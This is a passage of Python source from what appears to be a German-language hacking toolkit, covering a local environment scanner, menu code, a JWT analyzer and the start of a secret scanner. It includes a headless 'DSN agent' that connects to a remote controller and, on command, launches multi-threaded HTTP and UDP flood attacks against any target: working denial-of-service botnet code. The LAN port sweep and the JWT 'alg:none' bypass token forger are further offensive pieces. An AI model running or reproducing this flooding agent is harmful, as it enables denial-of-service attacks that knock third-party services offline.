        buckets = {"<200ms":0, "200-500ms":0, "500ms-1s":0, "1s-3s":0, ">3s":0}
        for _,ms,_ in timeline:
            if   ms <  200: buckets["<200ms"]     += 1
            elif ms <  500: buckets["200-500ms"]  += 1
            elif ms < 1000: buckets["500ms-1s"]   += 1
            elif ms < 3000: buckets["1s-3s"]       += 1
            else:           buckets[">3s"]         += 1
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {BLU}Latenz-Verteilung:{R}")
        total_r = len(timeline)
        for bname, cnt in buckets.items():
            pct = cnt / total_r * 100 if total_r else 0
            bar_w = int(pct / 2)
            bar   = f"{GRN if bname=='<200ms' else YEL if '<1s' in bname else RED}{'█'*bar_w}{DIM2}{'░'*(20-bar_w)}{R}"
            print(f"  {DG}║{R}  {DIM2}{bname:<12}{R}  {bar}  {YEL}{cnt:>5}{R}  ({pct:.0f}%)")

    print(f"  {DG}╚{'═'*W}╝{R}")
    wait()



# ── 107  UMGEBUNGS-SCANNER ───────────────────────────────────

def environment_scanner():
    RED = "[91m"; BRED = "[1;91m"
    hdr("UMGEBUNGS-SCANNER")

    _is_android = IS_ANDROID or os.path.isdir("/data/data/com.termux") or "TERMUX_VERSION" in os.environ

    print(f"  {C}Scannt die lokale Umgebung:{R}")
    if _is_android:
        print(f"  {G}[Android/Termux]{R}  {DIM}termux-api wird genutzt{R}\n")
    else:
        print(f"  {DIM}WiFi · Bluetooth · LAN · Ports · USB{R}\n")

    W2 = 74

    def _section(title):
        print(f"  {DG}╠{'═'*W2}╣{R}")
        print(f"  {DG}║{R}  {YG}▶ {title}{R}")
        print(f"  {DG}╠{'═'*W2}╣{R}")

    def _run(cmd, timeout=10):
        try:
            out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL,
                                          timeout=timeout).decode(errors="ignore")
            return True, out
        except FileNotFoundError:
            return False, f"Befehl nicht gefunden: {cmd[0]}"
        except subprocess.TimeoutExpired:
            return False, "Timeout"
        except Exception as e:
            return False, str(e)

    print(f"  {DG}╔{'═'*W2}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {RED}UMGEBUNGS-SCANNER  {DIM}— lokale Signale & Geräte{R}', W2)}{DG}║{R}")

    # ══ 1. WIFI ══════════════════════════════════════════════
    _section("WLAN / WIFI-SIGNALE IN DER NÄHE")
    wifi_nets = []
    open_nets = []
    if _is_android:
        ok, out = _run(["termux-wifi-scaninfo"], timeout=12)
        if ok:
            try:
                data = json.loads(out)
                for n in data:
                    lvl = n.get("level", -100)
                    sig = str(max(0, lvl + 100))
                    wifi_nets.append({
                        "ssid": n.get("ssid", "?"),
                        "bssid": n.get("bssid", ""),
                        "signal": sig,
                        "auth": n.get("capabilities", "?"),
                        "channel": ""
                    })
            except Exception:
                print(f"  {DG}║{R}  {YG}[~] termux-wifi-scaninfo: ungültige Ausgabe{R}")
        else:
            print(f"  {DG}║{R}  {YG}[~] {out}{R}")
            print(f"  {DG}║{R}  {DIM}Tipp: pkg install termux-api  dann termux-api App installieren{R}")
    elif IS_WIN:
        ok, out = _run(["netsh", "wlan", "show", "networks", "mode=bssid"])
        if not ok:
            ok, out = _run(["netsh", "wlan", "show", "networks"])
        if ok:
            ssid = auth = signal = bssid = channel = ""
            for line in out.splitlines():
                l = line.strip()
                if l.startswith("SSID") and ":" in l and "BSSID" not in l:
                    ssid = l.split(":", 1)[1].strip()
                    bssid = signal = auth = channel = ""
                elif "BSSID" in l and ":" in l:
                    bssid = l.split(":", 1)[1].strip()
                elif "Signal" in l and ":" in l:
                    signal = l.split(":", 1)[1].strip()
                elif "Authentication" in l and ":" in l:
                    auth = l.split(":", 1)[1].strip()
                elif "Channel" in l and ":" in l:
                    channel = l.split(":", 1)[1].strip()
                    if ssid:
                        wifi_nets.append({"ssid": ssid, "bssid": bssid,
                                          "signal": signal, "auth": auth, "channel": channel})
        else:
            print(f"  {DG}║{R}  {YG}[!] WLAN-Scan fehlgeschlagen.{R}")
            print(f"  {DG}║{R}  {DIM}Mögliche Ursachen auf Windows:{R}")
            print(f"  {DG}║{R}  {DIM}  • WLAN-Adapter deaktiviert (Gerätemanager prüfen){R}")
            print(f"  {DG}║{R}  {DIM}  • WLAN AutoConfig Dienst gestoppt{R}")
            print(f"  {DG}║{R}  {DIM}    → Win+R → services.msc → WLAN AutoConfig → Starten{R}")
            print(f"  {DG}║{R}  {DIM}  • Kein WLAN-Adapter vorhanden (z.B. Desktop-PC){R}")
    else:
        ok, out = _run(["nmcli", "-f", "SSID,BSSID,SIGNAL,SECURITY,CHAN",
                        "dev", "wifi", "list", "--rescan", "yes"], timeout=15)
        if not ok:
            ok, out = _run(["iwlist", "scan"], timeout=15)
        if ok:
            ssid = signal = bssid = auth = channel = ""
            for line in out.splitlines():
                l = line.strip()
                if 'ESSID:' in l:
                    ssid = l.split('"')[1] if '"' in l else ""
                elif "Address:" in l:
                    bssid = l.split("Address:", 1)[1].strip()
                elif "Signal level=" in l:
                    m = re.search(r'Signal level=([^\s]+)', l)
                    signal = m.group(1) if m else ""
                elif "Encryption key:" in l:
                    auth = "WPA" if "on" in l else "Open"
                elif "Channel:" in l:
                    channel = l.split("Channel:", 1)[1].strip()
                    if ssid:
                        wifi_nets.append({"ssid": ssid, "bssid": bssid,
                                          "signal": signal, "auth": auth, "channel": channel})
        else:
            print(f"  {DG}║{R}  {YG}[~] {out}{R}")

    if wifi_nets:
        def _sig_val(n):
            try:
                return int(re.sub(r'[^0-9\-]', '', str(n.get("signal", "0"))) or '0')
            except Exception:
                return 0
        wifi_nets.sort(key=_sig_val, reverse=True)
        open_nets = [n for n in wifi_nets
                     if not n.get("auth", "") or "OPEN" in str(n.get("auth", "")).upper()
                     or n.get("auth", "") in ("", "None", "--")]
        print(f"  {DG}║{R}  {G}{len(wifi_nets)} Netzwerke:{R}")
        print(f"  {DG}║{R}  {DIM}{'SSID':<28} {'Signal':<7} {'Sicherheit':<14} Kanal{R}")
        for n in wifi_nets[:20]:
            sig = str(n.get("signal", "?")).replace("%", "")
            auth = str(n.get("auth", "?"))[:14]
            ch = str(n.get("channel", "?"))
            ssid = str(n.get("ssid", "?"))[:27]
            sc = G if "WPA2" in auth or "WPA3" in auth else YG if "WPA" in auth else RED if "OPEN" in auth.upper() or auth in ("", "--") else DIM
            try:
                sv = int(sig)
                bars = "█" * (sv // 20) + "░" * (5 - sv // 20)
            except Exception:
                bars = "?????"
            print(f"  {DG}║{R}  {YG}{ssid:<28}{R} {G}{bars}{R} {sc}{auth:<14}{R} {DIM}{ch}{R}")
        if open_nets:
            print(f"\n  {RED}⚠  {len(open_nets)} OFFENE NETZWERKE (kein Passwort):{R}")
            for n in open_nets[:5]:
                print(f"  {RED}   → {n.get('ssid', '?')}{R}")
    else:
        if not _is_android:
            print(f"  {DG}║{R}  {DIM}Keine Netzwerke — WLAN-Adapter prüfen{R}")

    # ══ 2. BLUETOOTH ═════════════════════════════════════════
    _section("BLUETOOTH-GERÄTE IN DER NÄHE")
    bt_devices = []
    if _is_android:
        ok, out = _run(["termux-bluetooth-scan"], timeout=14)
        if ok:
            try:
                data = json.loads(out)
                for d in data:
                    bt_devices.append({"name": d.get("name", "?"),
                                       "addr": d.get("address", ""),
                                       "status": "gefunden"})
            except Exception:
                print(f"  {DG}║{R}  {YG}[~] Bluetooth-Scan: ungültige Ausgabe{R}")
        else:
            print(f"  {DG}║{R}  {YG}[~] {out}{R}")
            print(f"  {DG}║{R}  {DIM}Tipp: termux-api App aus Play Store installieren{R}")
    elif IS_WIN:
        ok, out = _run(["powershell", "-Command",
                        "Get-PnpDevice -Class Bluetooth | "
                        "Select-Object FriendlyName,Status | "
                        "ConvertTo-Csv -NoTypeInformation"], timeout=10)
        if ok:
            for line in out.splitlines()[1:]:
                parts = line.replace('"', '').split(',')
                if len(parts) >= 1 and parts[0].strip():
                    bt_devices.append({"name": parts[0].strip(),
                                       "status": parts[1].strip() if len(parts) > 1 else ""})
        else:
            print(f"  {DG}║{R}  {YG}[~] {out}{R}")
    else:
        ok, out = _run(["bluetoothctl", "devices"], timeout=8)
        if ok:
            for line in out.splitlines():
                m = re.match(r'Device ([0-9A-F:]{17})\s+(.+)', line)
                if m:
                    bt_devices.append({"addr": m.group(1), "name": m.group(2), "status": "gefunden"})
        else:
            print(f"  {DG}║{R}  {YG}[~] {out}{R}")

    if bt_devices:
        print(f"  {DG}║{R}  {G}{len(bt_devices)} Bluetooth-Gerät(e):{R}")
        for d in bt_devices[:15]:
            print(f"  {DG}║{R}  {C}●{R}  {YG}{str(d.get('name','?'))[:36]:<36}{R}  {DIM}{d.get('addr','')[:17]}{R}")
    else:
        if not _is_android:
            print(f"  {DG}║{R}  {DIM}Keine Bluetooth-Geräte gefunden{R}")

    # ══ 3. LAN-GERÄTE ════════════════════════════════════════
    _section("LAN-GERÄTE IM NETZWERK")
    lan_devices = []
    local_ip = ""
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        prefix = ".".join(local_ip.split(".")[:3])
        found_lock = threading.Lock()

        def _check_host(ip):
            try:
                for port in [80, 22, 443, 8080, 21]:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.4)
                    r = s.connect_ex((ip, port))
                    s.close()
                    if r == 0:
                        try:
                            hn = socket.gethostbyaddr(ip)[0]
                        except Exception:
                            hn = ""
                        with found_lock:
                            lan_devices.append({"ip": ip, "hostname": hn})
                        return
            except Exception:
                pass

        print(f"  {DG}║{R}  {DIM}Scanne {prefix}.1–254 (TCP-Connect) ...{R}")
        threads = [threading.Thread(target=_check_host, args=(f"{prefix}.{i}",), daemon=True)
                   for i in range(1, 255)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=0.6)
    except Exception as e:
        print(f"  {DG}║{R}  {YG}[~] LAN: {e}{R}")

    if lan_devices:
        lan_devices.sort(key=lambda d: int(d["ip"].split(".")[-1]))
        print(f"  {DG}║{R}  {G}{len(lan_devices)} aktive Geräte:{R}")
        for d in lan_devices[:25]:
            own = f"  {RED}◄ DU{R}" if d["ip"] == local_ip else ""
            print(f"  {DG}║{R}  {G}●{R}  {YG}{d['ip']:<16}{R}  {DIM}{d.get('hostname','')[:30]}{R}{own}")
    else:
        print(f"  {DG}║{R}  {DIM}Keine Geräte per TCP erreichbar{R}")

    # ══ 4. OFFENE LOKALE PORTS ═══════════════════════════════
    _section("OFFENE LOKALE PORTS")
    open_ports = []
    common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
                    1433, 3000, 3306, 3389, 4444, 5432, 5900, 6379, 8080,
                    8443, 8888, 9200, 27017]
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 135: "RPC", 139: "NetBIOS", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 1433: "MSSQL", 3000: "Dev-Server",
        3306: "MySQL", 3389: "RDP", 4444: "Backdoor?", 5432: "PostgreSQL",
        5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
        8888: "Jupyter", 9200: "Elasticsearch", 27017: "MongoDB"
    }
    risk_ports = {4444, 5900, 23, 445, 6379, 27017, 9200, 8888, 1337, 31337}
    for port in common_ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            if s.connect_ex(("127.0.0.1", port)) == 0:
                open_ports.append({"port": port,
                                   "service": services.get(port, "?"),
                                   "risk": port in risk_ports})
            s.close()
        except Exception:
            pass

    if open_ports:
        print(f"  {DG}║{R}  {G}{len(open_ports)} offene lokale Ports:{R}")
        for p in open_ports:
            sc = RED if p["risk"] else G
            note = f"  {RED}⚠ RISIKO{R}" if p["risk"] else ""
            print(f"  {DG}║{R}  {sc}●{R}  {YG}:{p['port']:<6}{R}  {DIM}{p['service']:<18}{R}{note}")
    else:
        print(f"  {DG}║{R}  {DIM}Keine offenen Ports auf localhost{R}")

    # ══ 5. USB / GERÄTE ══════════════════════════════════════
    _section("ANGESCHLOSSENE GERÄTE")
    usb_devices = []
    if _is_android:
        ok, out = _run(["termux-usb", "-l"], timeout=6)
        if ok:
            for line in out.strip().splitlines():
                if line.strip():
                    usb_devices.append({"name": line.strip(), "status": "verbunden"})
        else:
            print(f"  {DG}║{R}  {DIM}USB-Info: {out[:60]}{R}")
    elif IS_WIN:
        ok, out = _run(["powershell", "-Command",
                        "Get-PnpDevice | Where-Object{$_.InstanceId -like 'USB*'} | "
                        "Select-Object FriendlyName,Status | ConvertTo-Csv -NoTypeInformation"],
                       timeout=8)
        if ok:
            for line in out.splitlines()[1:]:
                parts = line.replace('"', '').split(',')
                if parts[0].strip():
                    usb_devices.append({"name": parts[0].strip(),
                                        "status": parts[1].strip() if len(parts) > 1 else ""})
        else:
            print(f"  {DG}║{R}  {YG}[~] {out}{R}")
    else:
        ok, out = _run(["lsusb"], timeout=5)
        if ok:
            for line in out.splitlines():
                m = re.match(r'Bus \d+ Device \d+: ID [0-9a-f:]+ (.+)', line)
                if m:
                    usb_devices.append({"name": m.group(1).strip(), "status": "verbunden"})
        else:
            print(f"  {DG}║{R}  {YG}[~] {out}{R}")

    if usb_devices:
        print(f"  {DG}║{R}  {G}{len(usb_devices)} Gerät(e):{R}")
        for d in usb_devices[:15]:
            print(f"  {DG}║{R}  {C}▲{R}  {YG}{str(d.get('name','?'))[:50]:<50}{R}  {DIM}{d.get('status','')}{R}")
    else:
        if not _is_android:
            print(f"  {DG}║{R}  {DIM}Keine Geräte gefunden{R}")

    # ══ 6. NETZWERKVERBINDUNGEN ═══════════════════════════════
    _section("AKTIVE VERBINDUNGEN (verdächtige Ports)")
    net_conns = []
    suspicious = {4444, 1337, 31337, 9001, 9050, 6667, 6666, 1080, 5554, 6200}

    if _is_android:
        try:
            for fname in ["/proc/net/tcp", "/proc/net/tcp6"]:
                if not os.path.exists(fname):
                    continue
                with open(fname) as f:
                    for line in f.readlines()[1:]:
                        parts = line.split()
                        if len(parts) < 4:
                            continue
                        if parts[3] == "01":   # ESTABLISHED
                            rem = parts[2]
                            rport = int(rem.split(":")[1], 16)
                            if rport in suspicious:
                                rip_hex = rem.split(":")[0]
                                try:
                                    rip = ".".join(str(int(rip_hex[i:i+2], 16))
                                                   for i in (6, 4, 2, 0))
                                except Exception:
                                    rip = rip_hex
                                net_conns.append({"remote": f"{rip}:{rport}",
                                                  "line": f"ESTABLISHED → {rip}:{rport}"})
        except Exception as e:
            print(f"  {DG}║{R}  {DIM}/proc/net/tcp: {e}{R}")
    else:
        cmd = ["netstat", "-ano"] if IS_WIN else ["netstat", "-tnp"]
        ok, out = _run(cmd, timeout=8)
        if ok:
            for line in out.splitlines():
                if "ESTABLISHED" in line or "HERGESTELLT" in line:
                    parts = line.split()
                    remote = parts[2] if len(parts) > 2 else ""
                    try:
                        rport = int(remote.rsplit(":", 1)[-1])
                        if rport in suspicious:
                            net_conns.append({"remote": remote,
                                              "line": line.strip()[:70]})
                    except Exception:
                        pass
        else:
            print(f"  {DG}║{R}  {YG}[~] {out}{R}")

    if net_conns:
        print(f"  {DG}║{R}  {RED}⚠  {len(net_conns)} verdächtige Verbindungen!{R}")
        for c in net_conns[:8]:
            print(f"  {DG}║{R}  {RED}●{R}  {DIM}{c['line'][:65]}{R}")
    else:
        print(f"  {DG}║{R}  {G}Keine verdächtigen Verbindungen erkannt{R}")

    # ══ ZUSAMMENFASSUNG ═══════════════════════════════════════
    print(f"  {DG}╠{'═'*W2}╣{R}")
    print(f"  {DG}║{R}  {C}ZUSAMMENFASSUNG:{R}")
    rows = [
        ("WiFi-Netzwerke",   len(wifi_nets),   f"davon {len(open_nets)} offen"),
        ("Bluetooth",        len(bt_devices),  ""),
        ("LAN-Geräte",       len(lan_devices), ""),
        ("Offene Ports",     len(open_ports),  f"davon {sum(1 for p in open_ports if p['risk'])} risikoreich"),
        ("USB/Geräte",       len(usb_devices), ""),
        ("Verdächt.Conns",   len(net_conns),   ""),
    ]
    for label, count, note in rows:
        danger = ((label == "Offene Ports" and any(p["risk"] for p in open_ports)) or
                  (label == "Verdächt.Conns" and count > 0) or
                  ("offen" in note and count > 0 and "0 offen" not in note))
        col = RED if danger else G if count > 0 else DIM
        dot = "●" if count > 0 else "○"
        print(f"  {DG}║{R}  {col}{dot}{R}  {DIM}{label:<20}{R}  {col}{count}{R}  {DIM}{note}{R}")
    print(f"  {DG}╚{'═'*W2}╝{R}")
    wait()

def _print_header():
    clear()
    print(BANNER)
    now  = datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
    node = platform.node()
    W    = 74
    line = f"  {DIM}NODE{R} {DG}:{R} {G}{node:<18}{R}  {DIM}TIME{R} {DG}:{R} {G}{now}{R}  {DIM}VER{R} {DG}:{R} {G}VS{R}"
    print(f"  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(line, W)}{DG}║{R}")
    print(f"  {DG}╚{'═'*W}╝{R}\n")

def _tool_search(query):
    """Sucht durch alle Tools nach Name oder Kategorie."""
    hdr("TOOL SUCHE")
    W = 74
    results = [t for t in ALL_TOOLS
               if query in t[1].lower() or query in t[2].lower() or query in t[0]]
    print(f"\n  {DG}╔{'═'*W}╗{R}")
    h = _pad(f"  {YG}SUCHERGEBNIS  '{query.upper()}' — {len(results)} Treffer{R}", W)
    print(f"  {DG}║{R}{h}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    if not results:
        print(f"  {DG}║{R}{_pad(f'  {DIM}Keine Tools gefunden.{R}', W)}{DG}║{R}")
    else:
        for tid, tname, ttag in results:
            tc   = _TAG_COL.get(ttag, G)
            line = f"  {DG}[{G}{tid:>2}{DG}]{R}  {tc}{ttag}{R}  {YG}{tname:<30}{R}"
            print(f"  {DG}║{R}{_pad(line, W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}{_pad(f'  {DIM}Tool-Nummer direkt eingeben um zu starten{R}', W)}{DG}║{R}")
    print(f"  {DG}╚{'═'*W}╝{R}\n")
    choice = input(f"  {DG}╘══[{G}TOOL-NR oder ENTER{DG}]══►{R} ").strip()
    if choice and choice in ACTIONS:
        ACTIONS[choice]()


def _print_main_menu():
    _print_header()
    W = 74
    print(f"  {DG}╔{'═'*W}╗{R}")
    title_inner = f"  {YG}SELECT CATEGORY{DG}{'─'*(W-17)}"
    print(f"  {DG}║{R}{_pad(title_inner, W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    for cid, tag, name, desc in CATEGORIES:
        tc    = _TAG_COL.get(tag, G)
        count = sum(1 for t in ALL_TOOLS if t[2] == tag)
        num   = f"{DG}[{G}{cid}{DG}]"
        tg    = f"{tc}{tag}{R}"
        nm    = f"{YG}{name:<12}{R}"
        ds    = f"{DIM}{desc[:36]:<36}{R}"
        cnt   = f"{DG}[{G}{count:02d}{DG}]"
        line  = f"  {num}  {tg}  {nm}  {ds}  {cnt}"
        print(f"  {DG}║{R}{_pad(line, W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    exit_line = f"  {DG}[{G}0{DG}]{R}  {DIM}---  {'EXIT':<12}  {'Programm beenden':<36}     {R}"
    print(f"  {DG}║{R}{_pad(exit_line, W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    hint = f"  {DIM}Suche: /Begriff  |  Direkt: Tool-Nummer eingeben{R}"
    print(f"  {DG}║{R}{_pad(hint, W)}{DG}║{R}")
    print(f"  {DG}╚{'═'*W}╝{R}\n")

def _pad(line, total_vis):
    """Fügt Leerzeichen hinzu damit die sichtbare Breite stimmt."""
    return line + " " * max(0, total_vis - _vis(line))

def _print_cat_menu(tag, name):
    clear()
    tc    = _TAG_COL.get(tag, G)
    tools = [(t[0], t[1]) for t in ALL_TOOLS if t[2] == tag]

    W    = 74
    now  = datetime.now().strftime("%H:%M:%S")
    node = platform.node()
    print(f"\n  {DG}╔{'═'*W}╗{R}")
    info = f"  {DIM}OPEN VS{R}  {DG}│{R}  {DIM}NODE{R} {DG}:{R} {G}{node}{R}  {DG}│{R}  {DIM}TIME{R} {DG}:{R} {G}{now}{R}"
    print(f"  {DG}║{R}{_pad(info, W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    title_inner = f"  {tc}{tag}{R}  {YG}{name.upper()}{DG}{'─'*(W-8-len(name))}{R}"
    print(f"  {DG}║{R}{_pad(title_inner, W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    numbered = [(str(i+1), t[0], t[1]) for i, t in enumerate(tools)]
    half  = (len(numbered)+1)//2
    left  = numbered[:half]
    right = numbered[half:]
    COL   = 37
    for i in range(max(len(left), len(right))):
        lcell = rcell = ""
        if i < len(left):
            loc, _, n = left[i]
            lcell = f"{DG}[{G}{loc:>2}{DG}]{R} {G}› {n}{R}"
        if i < len(right):
            loc, _, n = right[i]
            rcell = f"{DG}[{G}{loc:>2}{DG}]{R} {G}› {n}{R}"
        lpad = _pad(f"  {lcell}", COL)
        rpad = _pad(f"  {rcell}", COL)
        print(f"  {DG}║{R}{lpad}{rpad}{DG}║{R}")

    print(f"  {DG}╠{'═'*W}╣{R}")
    zurück = f"  {DG}[{G}0{DG}]{R} {G}› {DIM}zurück zur Kategorie-Auswahl{R}"
    print(f"  {DG}║{R}{_pad(zurück, W)}{DG}║{R}")
    print(f"  {DG}╚{'═'*W}╝{R}\n")
    return {str(i+1): t[0] for i, t in enumerate(tools)}

def _headless_agent(ctrl_ip, ctrl_port):
    """Startet direkt als DSN-Agent ohne UI — für VPS-Headless-Betrieb."""
    print(f"[DSN-AGENT] Verbinde mit {ctrl_ip}:{ctrl_port} ...")
    while True:  # reconnect loop
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ctrl_ip, ctrl_port))
            print(f"[DSN-AGENT] Verbunden. Warte auf Befehle ...")
            buf = b""
            while True:
                sock.settimeout(300)
                chunk = sock.recv(4096)
                if not chunk: break
                buf += chunk
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    try: msg = json.loads(line.decode())
                    except: continue
                    if msg.get("action") == "stop": sys.exit(0)
                    if msg.get("action") == "start":
                        atype    = msg.get("type","http")
                        tgt      = msg.get("target","")
                        tport    = msg.get("port", 80)
                        threads  = msg.get("threads", 50)
                        duration = msg.get("duration", 30)
                        print(f"[DSN-AGENT] Angriff: {atype.upper()} → {tgt}:{tport} {threads}T {duration}s")
                        stats    = {"sent":0,"errors":0}
                        stop_evt = threading.Event()
                        def _w(s=stats,e=stop_evt,a=atype,h=tgt,p=tport,d=duration):
                            deadline=time.time()+d
                            if a=="mc":
                                pld=[b"\xfe\x01",bytes([0x02])+b"\x00"*256]
                                udp=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                                udp.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,1024*1024)
                                i=0
                                while not e.is_set() and time.time()<deadline:
                                    try: udp.sendto(pld[i&1],(h,p)); s["sent"]+=1
                                    except: s["errors"]+=1
                                    i+=1
                            else:
                                while not e.is_set() and time.time()<deadline:
                                    try:
                                        import http.client
                                        c=http.client.HTTPConnection(h,p,timeout=2)
                                        c.request("GET","/",headers={"User-Agent":f"Mozilla/5.0 ({random.randint(1,9999)})"})
                                        c.getresponse(); c.close(); s["sent"]+=1
                                    except: s["errors"]+=1
                        wts=[threading.Thread(target=_w,daemon=True) for _ in range(threads)]
                        for t in wts: t.start()
                        deadline2=time.time()+duration
                        while time.time()<deadline2:
                            time.sleep(2)
                            try: sock.sendall((json.dumps({"stats":dict(stats)})+"\n").encode())
                            except: break
                        stop_evt.set()
                        for t in wts: t.join(timeout=2)
                        try: sock.sendall((json.dumps({"done":True,"stats":dict(stats)})+"\n").encode())
                        except: pass
                        print(f"[DSN-AGENT] Fertig — {stats['sent']} Pakete")
            sock.close()
        except Exception as e:
            print(f"[DSN-AGENT] Verbindungsfehler: {e} — retry in 5s ...")
            time.sleep(5)

def main():
    # Headless-Modus für VPS: python3 open_vs.py --dsn-agent <IP> <PORT>
    if len(sys.argv) >= 4 and sys.argv[1] == "--dsn-agent":
        _headless_agent(sys.argv[2], int(sys.argv[3]))
        return

    if os.name == "nt":
        os.system("chcp 65001 >nul 2>&1")
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")

    _boot_anim()

    while True:
        _print_main_menu()
        cat_choice = input(f"  {DG}╘══[{G}CATEGORY{DG}]══►{R} ").strip()

        if cat_choice == "0":
            clear()
            _matrix_rain(rows=4, cols=72, steps=8)
            clear()
            print(f"\n  {DG}╔{'═'*46}╗{R}")
            print(f"  {DG}║{R}  {C}SESSION TERMINATED  {DG}///  {YG}GOODBYE{R}           {DG}║{R}")
            print(f"  {DG}╚{'═'*46}╝{R}\n")
            time.sleep(0.6)
            sys.exit(0)

        cat_ids = {c[0] for c in CATEGORIES}

        # "/" prefix = Suche
        if cat_choice.startswith("/"):
            query = cat_choice[1:].strip().lower()
            if query:
                _tool_search(query)
            continue

        # Zahl die KEINE Kategorie ist = direkte Tool-ID
        if cat_choice.isdigit() and cat_choice not in cat_ids and cat_choice in ACTIONS:
            ACTIONS[cat_choice]()
            continue

        cat = next((c for c in CATEGORIES if c[0] == cat_choice), None)
        if not cat:
            print(f"  {DG}[{G}!{DG}]{R} {G}Ungueltige Eingabe. /Begriff fuer Suche.{R}")
            time.sleep(0.8); continue

        _, tag, name, _ = cat
        while True:
            local_map = _print_cat_menu(tag, name)  # {"1":"21", "2":"26", ...}
            choice = input(f"  {DG}┌─[{G}SELECT{DG}]──►{R} ").strip()
            if choice == "0": break
            global_id = local_map.get(choice)
            fn = ACTIONS.get(global_id) if global_id else None
            if fn:
                fn()
            else:
                print(f"  {DG}[{G}!{DG}]{R} {G}Ungültige Eingabe.{R}")
                time.sleep(0.6)


# ── 108  JWT ANALYZER ─────────────────────────────────────────────────────────
def jwt_analyzer():
    RED  = "\033[91m"; BRED = "\033[1;91m"
    hdr("JWT ANALYZER")
    print(f"  {DIM}Dekodiert JWT-Tokens und testet bekannte Schwachstellen.{R}\n")
    token = inp("JWT Token einfügen")
    if not token: wait(); return

    import base64 as _b64

    def _b64d(s):
        s += "=" * (-len(s) % 4)
        try: return json.loads(_b64.urlsafe_b64decode(s).decode(errors="ignore"))
        except: return {}

    parts = token.strip().split(".")
    W = 74
    print(f"\n  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {YG}JWT ANALYZER{R}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    if len(parts) != 3:
        print(f"  {DG}║{R}  {RED}Ungültiges JWT-Format (braucht 3 Teile getrennt durch .){R}")
        print(f"  {DG}╚{'═'*W}╝{R}"); wait(); return

    header  = _b64d(parts[0])
    payload = _b64d(parts[1])
    sig     = parts[2]

    def row(k, v, warn=False):
        col = RED if warn else G
        print(f"  {DG}║{R}  {DIM}{k:<22}{R}{col}{str(v)[:48]}{R}")

    print(f"  {DG}║{R}  {C}── HEADER ──{R}")
    for k, v in header.items(): row(k, v)
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}── PAYLOAD ──{R}")

    import time as _time
    now = _time.time()
    for k, v in payload.items():
        if k in ("exp","iat","nbf"):
            try:
                from datetime import datetime as _dt
                ts = _dt.utcfromtimestamp(int(v)).strftime("%Y-%m-%d %H:%M UTC")
                expired = k == "exp" and int(v) < now
                row(k, ts + (" ← ABGELAUFEN!" if expired else ""), warn=expired)
            except: row(k, v)
        else:
            row(k, v)

    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}── SICHERHEITS-CHECK ──{R}")

    alg = header.get("alg","")
    issues = []
    if alg.lower() == "none":
        issues.append(("KRITISCH", "Algorithmus 'none' — keine Signatur nötig!"))
    if alg.upper() in ("HS256","HS384","HS512"):
        issues.append(("INFO", f"Symmetrischer Algo ({alg}) — Secret muss geheim bleiben"))
    if alg.upper().startswith("RS") or alg.upper().startswith("ES"):
        issues.append(("OK", f"Asymmetrischer Algo ({alg}) — gut"))
    if "exp" not in payload:
        issues.append(("WARNUNG", "Kein 'exp' Feld — Token läuft nie ab!"))
    if "exp" in payload:
        try:
            if int(payload["exp"]) < now:
                issues.append(("WARNUNG", "Token ist abgelaufen"))
            elif int(payload["exp"]) - now > 86400 * 30:
                issues.append(("INFO", "Token läuft erst in >30 Tagen ab — sehr lange Laufzeit"))
        except: pass
    if sig == "" or sig == "AAAA":
        issues.append(("KRITISCH", "Leere Signatur entdeckt"))
    if not issues:
        issues.append(("OK", "Keine offensichtlichen Probleme gefunden"))

    sev_col = {"KRITISCH": RED, "WARNUNG": YG, "INFO": C, "OK": G}
    for sev, msg in issues:
        col = sev_col.get(sev, DIM)
        print(f"  {DG}║{R}  {col}[{sev}]{R}  {DIM}{msg}{R}")

    # alg:none attack demo
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {C}── ALG:NONE BYPASS TEST ──{R}")
    fake_h = _b64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
    fake_p = parts[1]
    fake_token = f"{fake_h}.{fake_p}."
    print(f"  {DG}║{R}  {DIM}Falls der Server 'alg:none' akzeptiert:{R}")
    print(f"  {DG}║{R}  {YG}{fake_token[:70]}{'...' if len(fake_token)>70 else ''}{R}")

    print(f"  {DG}╚{'═'*W}╝{R}")
    wait()


# ── 109  SECRET SCANNER ───────────────────────────────────────────────────────
def secret_scanner():
    RED  = "\033[91m"; BRED = "\033[1;91m"
    hdr("SECRET SCANNER")
